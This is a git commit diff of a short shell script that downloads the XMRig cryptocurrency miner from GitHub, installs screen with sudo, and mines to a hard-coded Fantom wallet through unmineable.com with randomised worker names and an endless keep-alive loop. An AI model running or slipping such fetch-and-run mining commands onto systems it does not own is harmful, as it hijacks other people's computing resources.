6d6253287b8771609d409e53955e09d758b8af3c
Maydayx2 <45719327+Maydayx2@users.noreply.github.com>
2022-06-04 12:36:58 -0500

    Update ftm.sh

--- ftm.sh
+++ ftm.sh
@@ -1,1 +1,11 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u FTM:0x7ed09285aee02b826ea9fb1358a9a4108bd6230e.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -t 2
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u FTM:0x7ed09285aee02b826ea9fb1358a9a4108bd6230e.Oktay-$RANDOM -p x
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
